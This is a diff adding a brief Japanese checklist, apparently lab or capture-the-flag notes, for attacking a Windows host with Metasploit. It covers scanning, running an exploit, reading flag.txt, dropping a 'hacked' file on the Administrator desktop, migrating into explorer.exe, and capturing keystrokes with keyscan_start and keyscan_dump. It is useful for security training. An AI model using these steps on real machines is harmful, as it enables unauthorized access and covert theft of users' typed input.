@@ -1,0 +1,27 @@
+1) ping
+2) nmap
+3) msfconsoleを起動する
+4) search
+5) use
+6) set
+7) exploit
+8) フラグを探索する
+shell
+cd /
+dir
+type flag.txt
+9) ディレクトリを管理者のデスクトップに切り替えて、テキストファイルを切り替える
+cd USERS \\Administrator\\Desktop
+dir
+ECHO ""You have been Hacked" > hacked.txt
+10) ターゲットマシン上で作成されたファイルを検証する
+11) 攻撃者のマシンからhacked.txtファイルを実行する
+12) ターゲットマシン上でhacked.txtファイルが開かれているかを確認する
+13) ターゲットマシン上で実行中のすべてのプロセスを確認し、explorer.exeプロセスないの現在のプロセスを移行する
+ps
+14) migrateを使用して、exploer.exeのPIDを使用して、プロセスを移行する
+15) キーストロークをキャプチャするためにkeyscan_startを実行する
+keyscan_start
+16) ターゲットマシンのメモ帳でランダムなテキストを入力する
+17) キーロガーデータをダンプする
+keyscan_dump
